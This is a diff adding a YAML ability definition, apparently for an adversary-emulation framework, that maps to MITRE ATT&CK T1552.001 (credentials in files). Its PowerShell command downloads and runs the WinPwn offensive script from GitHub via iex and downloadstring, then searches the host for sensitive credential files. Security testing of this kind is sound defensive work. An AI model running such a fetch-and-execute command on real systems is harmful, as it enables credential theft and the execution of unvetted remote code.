@@ -1,0 +1,19 @@
+---
+- id: 902759cef602e229403487b6eb762304
+  name: WinPwn - sensitivefiles
+  description: Search for sensitive files on this local system using the SensitiveFiles
+    function of WinPwn
+  tactic: credential-access
+  technique:
+    attack_id: T1552.001
+    name: 'Unsecured Credentials: Credentials In Files'
+  platforms:
+    windows:
+      psh:
+        command: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');
+          sensitivefiles -noninteractive -consoleoutput
+        payloads: []
+        cleanup: ''
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
